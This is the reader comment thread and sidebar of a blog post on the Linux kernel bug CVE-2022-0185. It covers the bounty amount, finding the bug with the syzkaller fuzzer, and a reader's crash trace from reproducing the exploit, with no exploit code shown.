<div class="comment-thread toplevel-thread"><ol id="top-ra"><li class="comment" id="c3404521548973654884"><div class="avatar-image-container"><img src="//blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEje_YdaD1qWVs6ntbyw9QBj0ChvIez8uUDDEMMaBX_u-4_H-BgNJieU-ZRHAsOVKpaYQj6ipgvBOk0DIgqvgbcnrYACrSqf6_Bb9km1mlRhcXYQulV4Y_q6EVaw_1GDEB0/s45-c/LOGO.PNG" alt=""/></div><div class="comment-block"><div class="comment-header"><cite class="user"><a href="https://www.blogger.com/profile/03453029715577115981" rel="nofollow">Maher</a></cite><span class="icon user "></span><span class="datetime secondary-text"><a rel="nofollow" href="https://www.willsroot.io/2022/01/cve-2022-0185.html?showComment=1643142861732#c3404521548973654884">January 25, 2022 at 12:34&#8239;PM</a></span></div><p class="comment-content">Great as always! willsroot OP!</p><span class="comment-actions secondary-text"><a class="comment-reply" target="_self" data-comment-id="3404521548973654884">Reply</a><span class="item-control blog-admin blog-admin pid-430515599"><a target="_self" href="https://www.blogger.com/delete-comment.g?blogID=8814147965526194982&amp;postID=3404521548973654884">Delete</a></span></span></div><div class="comment-replies"><div id="c3404521548973654884-rt" class="comment-thread inline-thread hidden"><span class="thread-toggle thread-expanded"><span class="thread-arrow"></span><span class="thread-count"><a target="_self">Replies</a></span></span><ol id="c3404521548973654884-ra" class="thread-chrome thread-expanded"><div></div><div id="c3404521548973654884-continue" class="continue"><a class="comment-reply" target="_self" data-comment-id="3404521548973654884">Reply</a></div></ol></div></div><div class="comment-replybox-single" id="c3404521548973654884-ce"></div></li><li class="comment" id="c8663001650071917590"><div class="avatar-image-container"><img src="//resources.blogblog.com/img/blank.gif" alt=""/></div><div class="comment-block"><div class="comment-header"><cite class="user">Anonymous</cite><span class="icon user "></span><span class="datetime secondary-text"><a rel="nofollow" href="https://www.willsroot.io/2022/01/cve-2022-0185.html?showComment=1643250842061#c8663001650071917590">January 26, 2022 at 6:34&#8239;PM</a></span></div><p class="comment-content">I&#39;m not a programmer myself, so don&#39;t get my words too close to the heart. But why does Crusader of Rust write PoC-code in C, not Rust?</p><span class="comment-actions secondary-text"><a class="comment-reply" target="_self" data-comment-id="8663001650071917590">Reply</a><span class="item-control blog-admin blog-admin pid-1851495194"><a target="_self" href="https://www.blogger.com/delete-comment.g?blogID=8814147965526194982&amp;postID=8663001650071917590">Delete</a></span></span></div><div class="comment-replies"><div id="c8663001650071917590-rt" class="comment-thread inline-thread hidden"><span class="thread-toggle thread-expanded"><span class="thread-arrow"></span><span class="thread-count"><a target="_self">Replies</a></span></span><ol id="c8663001650071917590-ra" class="thread-chrome thread-expanded"><div></div><div id="c8663001650071917590-continue" class="continue"><a class="comment-reply" target="_self" data-comment-id="8663001650071917590">Reply</a></div></ol></div></div><div class="comment-replybox-single" id="c8663001650071917590-ce"></div></li><li class="comment" id="c6582750789918167093"><div class="avatar-image-container"><img src="//www.blogger.com/img/blogger_logo_round_35.png" alt=""/></div><div class="comment-block"><div class="comment-header"><cite class="user"><a href="https://www.blogger.com/profile/02212114514632577467" rel="nofollow">neticegear</a></cite><span class="icon user "></span><span class="datetime secondary-text"><a rel="nofollow" href="https://www.willsroot.io/2022/01/cve-2022-0185.html?showComment=1643401611052#c6582750789918167093">January 28, 2022 at 12:26&#8239;PM</a></span></div><p class="comment-content">This comment has been removed by the author.</p><span class="comment-actions secondary-text"><a class="comment-reply" target="_self" data-comment-id="6582750789918167093">Reply</a><span class="item-control blog-admin blog-admin "><a target="_self" href="https://www.blogger.com/delete-comment.g?blogID=8814147965526194982&amp;postID=6582750789918167093">Delete</a></span></span></div><div class="comment-replies"><div id="c6582750789918167093-rt" class="comment-thread inline-thread hidden"><span class="thread-toggle thread-expanded"><span class="thread-arrow"></span><span class="thread-count"><a target="_self">Replies</a></span></span><ol id="c6582750789918167093-ra" class="thread-chrome thread-expanded"><div></div><div id="c6582750789918167093-continue" class="continue"><a class="comment-reply" target="_self" data-comment-id="6582750789918167093">Reply</a></div></ol></div></div><div class="comment-replybox-single" id="c6582750789918167093-ce"></div></li><li class="comment" id="c7144869253876542040"><div class="avatar-image-container"><img src="//www.blogger.com/img/blogger_logo_round_35.png" alt=""/></div><div class="comment-block"><div class="comment-header"><cite class="user"><a href="https://www.blogger.com/profile/02212114514632577467" rel="nofollow">neticegear</a></cite><span class="icon user "></span><span class="datetime secondary-text"><a rel="nofollow" href="https://www.willsroot.io/2022/01/cve-2022-0185.html?showComment=1643401728735#c7144869253876542040">January 28, 2022 at 12:28&#8239;PM</a></span></div><p class="comment-content">Mind-numbingly impressive! One question: why was the vulnerability bounty reduced to $31K from the $50.3K, given how this was a true 0day, and Google itself states:<br><br>&quot;Our base rewards for each publicly patched vulnerability is 31,337 USD (at most one exploit per vulnerability), but the reward can go up to 50,337 USD in two cases:<br>- If the vulnerability was otherwise unpatched in the Kernel (0day)<br>- If the exploit uses a new attack or technique, as determined by Google&quot;<br><br>PS: Your Rope2 write-up is still the gold standard among bin-exp writeups. That thing is out of this world!</p><span class="comment-actions secondary-text"><a class="comment-reply" target="_self" data-comment-id="7144869253876542040">Reply</a><span class="item-control blog-admin blog-admin pid-1553010864"><a target="_self" href="https://www.blogger.com/delete-comment.g?blogID=8814147965526194982&amp;postID=7144869253876542040">Delete</a></span></span></div><div class="comment-replies"><div id="c7144869253876542040-rt" class="comment-thread inline-thread"><span class="thread-toggle thread-expanded"><span class="thread-arrow"></span><span class="thread-count"><a target="_self">Replies</a></span></span><ol id="c7144869253876542040-ra" class="thread-chrome thread-expanded"><div><li class="comment" id="c1827488895908951872"><div class="avatar-image-container"><img src="//blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhPjJrtCrYmv0q_GhW41pXFQHnFh5UL-L3MuiX0kHUwV_2xa5sUW5iH5HYineYH9tCQXVi2SJTJ8sqkthw5ljQvd9yEGBCzSM8_T_HhVarfnQUd1WOzysinHIBdmyrQhb0/s45-c/cool_audio_waves_htb_profile.jpg" alt=""/></div><div class="comment-block"><div class="comment-header"><cite class="user"><a href="https://www.blogger.com/profile/02846380968246458737" rel="nofollow">willsroot</a></cite><span class="icon user blog-author"></span><span class="datetime secondary-text"><a rel="nofollow" href="https://www.willsroot.io/2022/01/cve-2022-0185.html?showComment=1643478564077#c1827488895908951872">January 29, 2022 at 9:49&#8239;AM</a></span></div><p class="comment-content">Thanks for reading the writeup! The bounty wasn&#39;t $50k since there was a bug collision (which I mentioned in the post) - thankfully, we were the first to properly disclose it, so Google still rewarded us with a generous bounty.</p><span class="comment-actions secondary-text"><span class="item-control blog-admin blog-admin pid-1768080780"><a target="_self" href="https://www.blogger.com/delete-comment.g?blogID=8814147965526194982&amp;postID=1827488895908951872">Delete</a></span></span></div><div class="comment-replies"><div id="c1827488895908951872-rt" class="comment-thread inline-thread hidden"><span class="thread-toggle thread-expanded"><span class="thread-arrow"></span><span class="thread-count"><a target="_self">Replies</a></span></span><ol id="c1827488895908951872-ra" class="thread-chrome thread-expanded"><div></div><div id="c1827488895908951872-continue" class="continue"><a class="comment-reply" target="_self" data-comment-id="1827488895908951872">Reply</a></div></ol></div></div><div class="comment-replybox-single" id="c1827488895908951872-ce"></div></li></div><div id="c7144869253876542040-continue" class="continue"><a class="comment-reply" target="_self" data-comment-id="7144869253876542040">Reply</a></div></ol></div></div><div class="comment-replybox-single" id="c7144869253876542040-ce"></div></li><li class="comment" id="c6882717636840299094"><div class="avatar-image-container"><img src="//www.blogger.com/img/blogger_logo_round_35.png" alt=""/></div><div class="comment-block"><div class="comment-header"><cite class="user"><a href="https://www.blogger.com/profile/09910401156377130515" rel="nofollow">Unknown</a></cite><span class="icon user "></span><span class="datetime secondary-text"><a rel="nofollow" href="https://www.willsroot.io/2022/01/cve-2022-0185.html?showComment=1643826097188#c6882717636840299094">February 2, 2022 at 10:21&#8239;AM</a></span></div><p class="comment-content">Nice job!<br>Btw, I wonder how you found the bug. Did you run syzkaller directly and found it? Did you make any customization to syzkaller? If possible, can you share what customization you did? Thanks!<br>I&#39;m determined to find an exploitable Linux kernel 0day this year as well. But so far, it didn&#39;t find anything exploitable yet.<br>-- kylebot</p><span class="comment-actions secondary-text"><a class="comment-reply" target="_self" data-comment-id="6882717636840299094">Reply</a><span class="item-control blog-admin blog-admin pid-319949224"><a target="_self" href="https://www.blogger.com/delete-comment.g?blogID=8814147965526194982&amp;postID=6882717636840299094">Delete</a></span></span></div><div class="comment-replies"><div id="c6882717636840299094-rt" class="comment-thread inline-thread"><span class="thread-toggle thread-expanded"><span class="thread-arrow"></span><span class="thread-count"><a target="_self">Replies</a></span></span><ol id="c6882717636840299094-ra" class="thread-chrome thread-expanded"><div><li class="comment" id="c7885964754753598860"><div class="avatar-image-container"><img src="//blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhPjJrtCrYmv0q_GhW41pXFQHnFh5UL-L3MuiX0kHUwV_2xa5sUW5iH5HYineYH9tCQXVi2SJTJ8sqkthw5ljQvd9yEGBCzSM8_T_HhVarfnQUd1WOzysinHIBdmyrQhb0/s45-c/cool_audio_waves_htb_profile.jpg" alt=""/></div><div class="comment-block"><div class="comment-header"><cite class="user"><a href="https://www.blogger.com/profile/02846380968246458737" rel="nofollow">willsroot</a></cite><span class="icon user blog-author"></span><span class="datetime secondary-text"><a rel="nofollow" href="https://www.willsroot.io/2022/01/cve-2022-0185.html?showComment=1644013189805#c7885964754753598860">February 4, 2022 at 2:19&#8239;PM</a></span></div><p class="comment-content">Surprisingly, the default configuration for syzkaller actually found this! It was interesting to see how both of our fuzzer and syzbot&#39;s found this bug a few days apart in 2022 while the bug existed since 2019 - perhaps some recent change in either the kernel or syzkaller made it easier to trigger.</p><span class="comment-actions secondary-text"><span class="item-control blog-admin blog-admin pid-1768080780"><a target="_self" href="https://www.blogger.com/delete-comment.g?blogID=8814147965526194982&amp;postID=7885964754753598860">Delete</a></span></span></div><div class="comment-replies"><div id="c7885964754753598860-rt" class="comment-thread inline-thread hidden"><span class="thread-toggle thread-expanded"><span class="thread-arrow"></span><span class="thread-count"><a target="_self">Replies</a></span></span><ol id="c7885964754753598860-ra" class="thread-chrome thread-expanded"><div></div><div id="c7885964754753598860-continue" class="continue"><a class="comment-reply" target="_self" data-comment-id="7885964754753598860">Reply</a></div></ol></div></div><div class="comment-replybox-single" id="c7885964754753598860-ce"></div></li><li class="comment" id="c2595950417383235259"><div class="avatar-image-container"><img src="//www.blogger.com/img/blogger_logo_round_35.png" alt=""/></div><div class="comment-block"><div class="comment-header"><cite class="user"><a href="https://www.blogger.com/profile/14268155197947865774" rel="nofollow">Unknown</a></cite><span class="icon user "></span><span class="datetime secondary-text"><a rel="nofollow" href="https://www.willsroot.io/2022/01/cve-2022-0185.html?showComment=1644827898328#c2595950417383235259">February 14, 2022 at 12:38&#8239;AM</a></span></div><p class="comment-content">Great!<br>Do you mean (default configuration), no enabled_syscalls in syzkaller.cfg ?<br><br>-- Enesdex</p><span class="comment-actions secondary-text"><span class="item-control blog-admin blog-admin pid-110996568"><a target="_self" href="https://www.blogger.com/delete-comment.g?blogID=8814147965526194982&amp;postID=2595950417383235259">Delete</a></span></span></div><div class="comment-replies"><div id="c2595950417383235259-rt" class="comment-thread inline-thread hidden"><span class="thread-toggle thread-expanded"><span class="thread-arrow"></span><span class="thread-count"><a target="_self">Replies</a></span></span><ol id="c2595950417383235259-ra" class="thread-chrome thread-expanded"><div></div><div id="c2595950417383235259-continue" class="continue"><a class="comment-reply" target="_self" data-comment-id="2595950417383235259">Reply</a></div></ol></div></div><div class="comment-replybox-single" id="c2595950417383235259-ce"></div></li><li class="comment" id="c1085159094503468173"><div class="avatar-image-container"><img src="//blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhPjJrtCrYmv0q_GhW41pXFQHnFh5UL-L3MuiX0kHUwV_2xa5sUW5iH5HYineYH9tCQXVi2SJTJ8sqkthw5ljQvd9yEGBCzSM8_T_HhVarfnQUd1WOzysinHIBdmyrQhb0/s45-c/cool_audio_waves_htb_profile.jpg" alt=""/></div><div class="comment-block"><div class="comment-header"><cite class="user"><a href="https://www.blogger.com/profile/02846380968246458737" rel="nofollow">willsroot</a></cite><span class="icon user blog-author"></span><span class="datetime secondary-text"><a rel="nofollow" href="https://www.willsroot.io/2022/01/cve-2022-0185.html?showComment=1645321669111#c1085159094503468173">February 19, 2022 at 5:47&#8239;PM</a></span></div><p class="comment-content">Yes, our fuzzer which caught this was setup as just the default configuration (where the only changes were adjustments for resource consumption).</p><span class="comment-actions secondary-text"><span class="item-control blog-admin blog-admin pid-1768080780"><a target="_self" href="https://www.blogger.com/delete-comment.g?blogID=8814147965526194982&amp;postID=1085159094503468173">Delete</a></span></span></div><div class="comment-replies"><div id="c1085159094503468173-rt" class="comment-thread inline-thread hidden"><span class="thread-toggle thread-expanded"><span class="thread-arrow"></span><span class="thread-count"><a target="_self">Replies</a></span></span><ol id="c1085159094503468173-ra" class="thread-chrome thread-expanded"><div></div><div id="c1085159094503468173-continue" class="continue"><a class="comment-reply" target="_self" data-comment-id="1085159094503468173">Reply</a></div></ol></div></div><div class="comment-replybox-single" id="c1085159094503468173-ce"></div></li><li class="comment" id="c378413763570407824"><div class="avatar-image-container"><img src="//www.blogger.com/img/blogger_logo_round_35.png" alt=""/></div><div class="comment-block"><div class="comment-header"><cite class="user"><a href="https://www.blogger.com/profile/06580711217594488355" rel="nofollow">Unknown</a></cite><span class="icon user "></span><span class="datetime secondary-text"><a rel="nofollow" href="https://www.willsroot.io/2022/01/cve-2022-0185.html?showComment=1647413137625#c378413763570407824">March 15, 2022 at 11:45&#8239;PM</a></span></div><p class="comment-content">https://github.com/google/syzkaller/commit/18f846ca807cfc6df9c3da3c0ab08251277dfefb,after this commit,syzkaller can find this crash</p><span class="comment-actions secondary-text"><span class="item-control blog-admin blog-admin pid-182050335"><a target="_self" href="https://www.blogger.com/delete-comment.g?blogID=8814147965526194982&amp;postID=378413763570407824">Delete</a></span></span></div><div class="comment-replies"><div id="c378413763570407824-rt" class="comment-thread inline-thread hidden"><span class="thread-toggle thread-expanded"><span class="thread-arrow"></span><span class="thread-count"><a target="_self">Replies</a></span></span><ol id="c378413763570407824-ra" class="thread-chrome thread-expanded"><div></div><div id="c378413763570407824-continue" class="continue"><a class="comment-reply" target="_self" data-comment-id="378413763570407824">Reply</a></div></ol></div></div><div class="comment-replybox-single" id="c378413763570407824-ce"></div></li></div><div id="c6882717636840299094-continue" class="continue"><a class="comment-reply" target="_self" data-comment-id="6882717636840299094">Reply</a></div></ol></div></div><div class="comment-replybox-single" id="c6882717636840299094-ce"></div></li><li class="comment" id="c9220270554000243498"><div class="avatar-image-container"><img src="//www.blogger.com/img/blogger_logo_round_35.png" alt=""/></div><div class="comment-block"><div class="comment-header"><cite class="user"><a href="https://www.blogger.com/profile/05990003904769261027" rel="nofollow">Dgh0st</a></cite><span class="icon user "></span><span class="datetime secondary-text"><a rel="nofollow" href="https://www.willsroot.io/2022/01/cve-2022-0185.html?showComment=1644748948728#c9220270554000243498">February 13, 2022 at 2:42&#8239;AM</a></span></div><p class="comment-content">Great writeup!!<br>There&#39;s a problem when I try to reproduce the exploit for kctf. Is it okay for linux kernel when you kfree an address which is not alloced by kmalloc (in the writeup the address is kmalloc-1k - 0x20), will this kind of action cause kernel panic?<br><br>I test my the exploit on my local kctf enviroment, and always get crash when try to free the security pointer:<br>[  134.915194] Call Trace:<br>[  134.915410]  kfree+0x2a9/0x340<br>[  134.915673]  ? security_msg_msg_free+0x3d/0x50<br>[  134.916045]  security_msg_msg_free+0x3d/0x50<br>[  134.916405]  free_msg+0x14/0x50<br>[  134.916669]  ? do_msgrcv+0x6a0/0x6a0<br>[  134.916974]  do_msgrcv+0x64c/0x6a0<br>[  134.917261]  ? do_msgrcv+0x6a0/0x6a0<br>[  134.917562]  do_syscall_64+0x37/0x50<br></p><span class="comment-actions secondary-text"><a class="comment-reply" target="_self" data-comment-id="9220270554000243498">Reply</a><span class="item-control blog-admin blog-admin pid-28160707"><a target="_self" href="https://www.blogger.com/delete-comment.g?blogID=8814147965526194982&amp;postID=9220270554000243498">Delete</a></span></span></div><div class="comment-replies"><div id="c9220270554000243498-rt" class="comment-thread inline-thread"><span class="thread-toggle thread-expanded"><span class="thread-arrow"></span><span class="thread-count"><a target="_self">Replies</a></span></span><ol id="c9220270554000243498-ra" class="thread-chrome thread-expanded"><div><li class="comment" id="c3143857889703592054"><div class="avatar-image-container"><img src="//blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhPjJrtCrYmv0q_GhW41pXFQHnFh5UL-L3MuiX0kHUwV_2xa5sUW5iH5HYineYH9tCQXVi2SJTJ8sqkthw5ljQvd9yEGBCzSM8_T_HhVarfnQUd1WOzysinHIBdmyrQhb0/s45-c/cool_audio_waves_htb_profile.jpg" alt=""/></div><div class="comment-block"><div class="comment-header"><cite class="user"><a href="https://www.blogger.com/profile/02846380968246458737" rel="nofollow">willsroot</a></cite><span class="icon user blog-author"></span><span class="datetime secondary-text"><a rel="nofollow" href="https://www.willsroot.io/2022/01/cve-2022-0185.html?showComment=1645321313236#c3143857889703592054">February 19, 2022 at 5:41&#8239;PM</a></span></div><p class="comment-content">Misaligned frees should be allowed, as I did rely on that behavior in the exploit. I have seen that crash happen several times when debugging, but it didn&#39;t happen often enough for me to investigate.</p><span class="comment-actions secondary-text"><span class="item-control blog-admin blog-admin pid-1768080780"><a target="_self" href="https://www.blogger.com/delete-comment.g?blogID=8814147965526194982&amp;postID=3143857889703592054">Delete</a></span></span></div><div class="comment-replies"><div id="c3143857889703592054-rt" class="comment-thread inline-thread hidden"><span class="thread-toggle thread-expanded"><span class="thread-arrow"></span><span class="thread-count"><a target="_self">Replies</a></span></span><ol id="c3143857889703592054-ra" class="thread-chrome thread-expanded"><div></div><div id="c3143857889703592054-continue" class="continue"><a class="comment-reply" target="_self" data-comment-id="3143857889703592054">Reply</a></div></ol></div></div><div class="comment-replybox-single" id="c3143857889703592054-ce"></div></li></div><div id="c9220270554000243498-continue" class="continue"><a class="comment-reply" target="_self" data-comment-id="9220270554000243498">Reply</a></div></ol></div></div><div class="comment-replybox-single" id="c9220270554000243498-ce"></div></li><li class="comment" id="c4980255385319600885"><div class="avatar-image-container"><img src="//resources.blogblog.com/img/blank.gif" alt=""/></div><div class="comment-block"><div class="comment-header"><cite class="user">Anonymous</cite><span class="icon user "></span><span class="datetime secondary-text"><a rel="nofollow" href="https://www.willsroot.io/2022/01/cve-2022-0185.html?showComment=1669366332857#c4980255385319600885">November 25, 2022 at 12:52&#8239;AM</a></span></div><p class="comment-content">guy</p><span class="comment-actions secondary-text"><a class="comment-reply" target="_self" data-comment-id="4980255385319600885">Reply</a><span class="item-control blog-admin blog-admin pid-1851495194"><a target="_self" href="https://www.blogger.com/delete-comment.g?blogID=8814147965526194982&amp;postID=4980255385319600885">Delete</a></span></span></div><div class="comment-replies"><div id="c4980255385319600885-rt" class="comment-thread inline-thread hidden"><span class="thread-toggle thread-expanded"><span class="thread-arrow"></span><span class="thread-count"><a target="_self">Replies</a></span></span><ol id="c4980255385319600885-ra" class="thread-chrome thread-expanded"><div></div><div id="c4980255385319600885-continue" class="continue"><a class="comment-reply" target="_self" data-comment-id="4980255385319600885">Reply</a></div></ol></div></div><div class="comment-replybox-single" id="c4980255385319600885-ce"></div></li></ol><div id="top-continue" class="continue"><a class="comment-reply" target="_self">Add comment</a></div><div class="comment-replybox-thread" id="top-ce"></div><div class="loadmore hidden" data-post-id="8508102479187046073"><a target="_self">Load more...</a></div></div>
</div>
</div>
<p class='comment-footer'>
<div class='comment-form'>
<a name='comment-form'></a>
<p>
</p>
<a href='https://www.blogger.com/comment/frame/8814147965526194982?po=8508102479187046073&hl=en' id='comment-editor-src'></a>
<iframe allowtransparency='true' class='blogger-iframe-colorize blogger-comment-from-post' frameborder='0' height='410px' id='comment-editor' name='comment-editor' src='' width='100%'></iframe>
<script src='https://www.blogger.com/static/v1/jsbin/2315299244-comment_from_post_iframe.js' type='text/javascript'></script>
<script type='text/javascript'>
      BLOG_CMT_createIframe('https://www.blogger.com/rpc_relay.html');
    </script>
</div>
</p>
<div id='backlinks-container'>
<div id='Blog1_backlinks-container'>
</div>
</div>
</div>
</div>

        </div></div>
      
</div>
<div class='blog-pager' id='blog-pager'>
<span id='blog-pager-newer-link'>
<a class='blog-pager-newer-link' href='https://www.willsroot.io/2022/03/zer0pts-ctf-2022-krce-writeup.html' id='Blog1_blog-pager-newer-link' title='Newer Post'>Newer Post</a>
</span>
<span id='blog-pager-older-link'>
<a class='blog-pager-older-link' href='https://www.willsroot.io/2021/10/pbctf-2021-nightclub-writeup-more-fun.html' id='Blog1_blog-pager-older-link' title='Older Post'>Older Post</a>
</span>
<a class='home-link' href='https://www.willsroot.io/'>Home</a>
</div>
<div class='clear'></div>
<div class='post-feeds'>
<div class='feed-links'>
Subscribe to:
<a class='feed-link' href='https://www.willsroot.io/feeds/8508102479187046073/comments/default' target='_blank' type='application/atom+xml'>Post Comments (Atom)</a>
</div>
</div>
</div></div>
</div>
</div>
<div class='column-left-outer'>
<div class='column-left-inner'>
<aside>
</aside>
</div>
</div>
<div class='column-right-outer'>
<div class='column-right-inner'>
<aside>
<div class='sidebar section' id='sidebar-right-1'><div class='widget Text' data-version='1' id='Text1'>
<h2 class='title'>Contact</h2>
<div class='widget-content'>
For further inquiries, contact me at <a href="mailto:will@willsroot.io">will@willsroot.io</a>. Feel free to use my <a href="/p/pgp-key.html">PGP key</a>.
</div>
<div class='clear'></div>
</div><div class='widget HTML' data-version='1' id='HTML3'>
<h2 class='title'>Publications</h2>
<div class='widget-content'>
<a href="https://dl.acm.org/doi/pdf/10.1145/3623652.3623669">EntryBleed: A Universal KASLR Bypass against KPTI on Linux</a><br />HASP 2023 (with MICRO)<br />Best Paper Award
</div>
<div class='clear'></div>
</div><div class='widget HTML' data-version='1' id='HTML2'>
<h2 class='title'>Github</h2>
<div class='widget-content'>
Click <a href="https://github.com/BitsByWill">here</a> to access my Github page.
</div>
<div class='clear'></div>
</div><div class='widget BlogArchive' data-version='1' id='BlogArchive1'>
<h2>Blog Archive</h2>
<div class='widget-content'>
<div id='ArchiveList'>
<div id='BlogArchive1_ArchiveList'>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.willsroot.io/2024/'>
2024
</a>
<span class='post-count' dir='ltr'>(2)</span>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.willsroot.io/2024/08/'>
August
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.willsroot.io/2023/'>
2023
</a>
<span class='post-count' dir='ltr'>(3)</span>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.willsroot.io/2023/08/'>
August
</a>
<span class='post-count' dir='ltr'>(3)</span>
</li>
</ul>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate expanded'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy toggle-open'>

        &#9660;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.willsroot.io/2022/'>
2022
</a>
<span class='post-count' dir='ltr'>(4)</span>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.willsroot.io/2022/12/'>
December
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.willsroot.io/2022/08/'>
August
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.willsroot.io/2022/03/'>
March
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate expanded'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy toggle-open'>

        &#9660;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.willsroot.io/2022/01/'>
January
</a>
<span class='post-count' dir='ltr'>(1)</span>
<ul class='posts'>
<li><a href='https://www.willsroot.io/2022/01/cve-2022-0185.html'>CVE-2022-0185 - Winning a $31337 Bounty after Pwni...</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.willsroot.io/2021/'>
2021
</a>
<span class='post-count' dir='ltr'>(10)</span>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.willsroot.io/2021/10/'>
October
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.willsroot.io/2021/08/'>
August
</a>
<span class='post-count' dir='ltr'>(3)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.willsroot.io/2021/07/'>
July
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.willsroot.io/2021/04/'>
April
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.willsroot.io/2021/03/'>
March
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.willsroot.io/2021/02/'>
February
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.willsroot.io/2021/01/'>
January
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.willsroot.io/2020/'>
2020
</a>
<span class='post-count' dir='ltr'>(10)</span>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.willsroot.io/2020/12/'>
December
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.willsroot.io/2020/11/'>
November
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.willsroot.io/2020/10/'>
October
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.willsroot.io/2020/06/'>
June
</a>
<span class='post-count' dir='ltr'>(3)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.willsroot.io/2020/05/'>
May
</a>
<span class='post-count' dir='ltr'>(2)</span>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
<a class='post-count-link' href='https://www.willsroot.io/2020/04/'>
April
</a>
<span class='post-count' dir='ltr'>(1)</span>
</li>
</ul>
</li>
</ul>
<ul class='hierarchy'>
<li class='archivedate collapsed'>
<a class='toggle' href='javascript:void(0)'>
<span class='zippy'>

        &#9658;&#160;
      
</span>
</a>
